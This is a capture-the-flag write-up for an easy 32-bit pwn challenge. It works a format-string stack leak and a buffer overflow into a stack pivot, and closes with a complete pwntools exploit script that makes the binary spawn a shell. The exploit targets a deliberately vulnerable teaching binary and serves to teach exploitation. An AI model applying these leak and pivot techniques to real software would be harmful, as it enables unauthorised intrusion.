---
title: 'oldschool'
description: 'A simple pwn challenge involving a stack pivot and a format string leak.'
date: 2026-01-12
tags: ['stack-pivot', 'format-string']
authors: ['w6rst']
order: 0
---

import { Code } from 'astro-expressive-code/components'
import Challenge from '@/components/mdx/Challenge.astro'
import Callout from '@/components/mdx/Callout.astro'
import pwn1_checksec from './assets/pwn1_checksec.txt?raw'
import pwn1_tele from './assets/pwn1_tele.txt?raw'

## oldschool

<Challenge
  category="pwn"
  files={['main', 'main.c', 'Dockerfile']}
  description="learn to pwn with this easy challenge!"
/>

Inspecting the binary with `checksec`:

<Code code={pwn1_checksec} lang="ansi" />

The binary is a 32-bit ELF with **NX enabled** but **No canary** and **No PIE**. This means we have fixed addresses but cannot execute shellcode on the stack.

## Program Analysis

The program is straightforward. It contains a `win(){:c}` function that spawns a shell if the correct password is provided.

```c
void win(char *password)
{
    if (strcmp(password, "hwhwhwhwhwhw") == 0)
    {
        system("/bin/sh");
    }
}
```

In `main(){:c}`, we see two opportunities for exploitation:

```c
12: int main()
13: {
14:     setvbuf(stdout, NULL, _IONBF, 0);
15:     setvbuf(stdin, NULL, _IONBF, 0);
16: 
17:     char input[15];
18:     char password[15];
19: 
20:     printf("simple pwn... no trickery needed...\n");
21:     gets(input);
22:     printf(input);
23:     printf("\nsay yer magic words: ");
24:     gets(password);
25:     printf(password);
...
37:     return 0;
38: }
```

- **Format String Vulnerability**: Both `printf(input){:c}` (line 22) and `printf(password){:c}` (line 25) are vulnerable because the input is passed directly as a format string.
- **Buffer Overflow**: Both `gets(input){:c}` (line 21) and `gets(password){:c}` (line 24) are vulnerable because `gets(){:c}` does not check the size of the input.
While the program checks if `input == "hehehehehehehe"` and `password == "huhuhuhuhuhu"` at the end of `main(){:c}`, we can bypass this logic entirely by redirecting execution.

The binary was compiled in a way that the `main(){:c}` function performs a stack restoration from the `ecx` register. This is often seen in 32-bit binaries compiled with certain stack alignment optimizations.

Looking at the disassembly of the `main(){:c}` function's epilogue:

```txt
pop    ecx
pop    ebx
pop    ebp
lea    esp, [ecx - 4]
ret
```

If we can control the value of `ecx` before the `lea esp, [ecx - 4]{:c}` instruction, we can move the stack pointer `esp` to a location of our choice. Since the `ret` instruction pops the next instruction pointer from the stack, this gives us full control over execution.

## Exploitation

Before we can pivot the stack, we need a reliable stack address. Since we have a format string vulnerability in the first `printf(input){:c}`, we can fuzz the stack to find a leak.

I used the following `fuzz.py` script to inspect the stack values:

```python
from pwn import *

elf = context.binary = ELF('./main', checksec=False)

for i in range(20):
    try:
        io = process(level='error')
        io.sendlineafter(b'needed...\n','%{}$p'.format(i).encode())
        result = io.recvline().decode()
        if result:
            print(f"{i}: {result.strip()}")
    except EOFError:
        pass
```

Running the fuzzer gives us the following output:

```text
...
10: 0xf7fc1400
11: (nil)
12: 0xffffd3a0
13: 0xf7faae34
...
```

The leak at index **12** represents a stack address that we can use as a base for our calculations.

We need to point `ecx` (and subsequently `esp`) back to our `input` buffer where our payload lives. By debugging the binary, we can determine the exact distance between the leaked address at index 12 and the start of our payload.

In this case, the `stack_target` is exactly **48 bytes** below the leaked address. We subtract this offset so that when `main(){:c}` performs the stack pivot, `esp` lands exactly on our forged stack.

```python
# 1. Leak stack address
io.sendlineafter(b'...\n', b'%12$p')
leak = int(io.recvline().strip(), 16)
stack_target = leak - 48 # Offset to point back specifically to P+14
```
Once our payload is sent to `gets(password){:c}`, the stack frame for `main(){:c}` is corrupted. Here is a visual representation of the memory layout just before the `ret{:c}` instruction in the function epilogue:

<Code code={pwn1_tele} lang="ansi" />

The magic happens when the function epilogue executes. By pointing `ecx` to an address 4 bytes *after* our `&win` pointer, the `lea esp, [ecx-4]{:c}` instruction perfectly aligns `esp` with our target address. When `ret{:c}` is executed, it pops `&win` and launches the shell.

Next, we craft the full payload:

```python
win = elf.sym["win"]
str_addr = next(elf.search(b'hwhwhwhwhwhw'))

payload = flat([
    b'A'*10,         # Fill buffer
    p32(win),        # win() address (pivoted EIP)
    p32(0),          # return address (dummy)
    p32(str_addr),   # win() argument
    p32(stack_target)*3,    # overwrite ECX, EBX, EBP
])

io.sendlineafter(b'magic words: ', payload)
```

When `main(){:c}` returns, the stack pivots to our buffer, and the `win(){:c}` function is called with the required password argument, spawning our shell.

### Exploit Script

```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
set follow-fork-mode parent
set follow-exec-mode same
b *0x0804925d
b *0x080492b1
b *0x080492cc
continue
'''.format(**locals())

exe = './main'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def logleak(name, val):  log.success(name+' = %#x' % val)
def loglibc(): log.success('libc addr = %#x' % libc.address)
def logbase(): log.success('pie addr = %#x' % elf.address)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


io = start()

win = elf.sym["win"]
str = next(elf.search(b'hwhwhwhwhwhw'))

sla(b'...\n',b'%12$p')
leak = int(io.recvline().strip(),16)
stack = leak - 48

logleak('stack leak',leak)
logleak('payload address',stack)
logleak('win',win)

payload = flat([
    b'A'*10,
    p32(win),
    p32(0),
    p32(str),
    p32(stack)*3,
])

sl(payload)

io.interactive()
```
